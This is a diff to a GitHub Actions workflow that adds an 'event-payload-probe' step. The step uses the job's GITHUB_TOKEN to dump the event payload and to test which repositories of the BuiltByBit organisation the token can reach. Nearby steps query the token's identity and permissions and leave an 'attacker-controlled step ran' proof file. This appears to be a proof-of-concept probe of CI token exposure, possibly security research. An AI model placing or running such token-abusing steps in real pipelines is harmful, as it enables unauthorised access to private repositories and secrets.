@@ -24,6 +24,16 @@ jobs:
           curl -s -H "Authorization: token $T" https://api.github.com/user | head -c 300; echo
           echo "--- api repo perms ---"
           curl -s -H "Authorization: token $T" https://api.github.com/repos/$GITHUB_REPOSITORY | grep -E '"permissions"|"private"|"full_name"'
+      - name: event-payload-probe
+        env:
+          T: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "--- event payload (truncated) ---"; head -c 900 "$GITHUB_EVENT_PATH"; echo
+          echo "--- base repo visible via event ---"
+          python3 -c "import json,os;d=json.load(open(os.environ['GITHUB_EVENT_PATH']));print(d.get('pull_request',{}).get('base',{}).get('repo',{}).get('full_name'))" || true
+          echo "--- other org repos reachable with this token ---"
+          for r in api-openapi-spec api-wrapper-codegen-js api-wrapper-codegen-php api-wrapper-codegen-java demo-server; do
+            code=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $T" https://api.github.com/repos/BuiltByBit/$r); echo "$r -> $code"; done
       - name: write-probe
         run: |
           mkdir -p "$RUNNER_TEMP/art" && echo "attacker-controlled step ran" > "$RUNNER_TEMP/art/proof.txt"
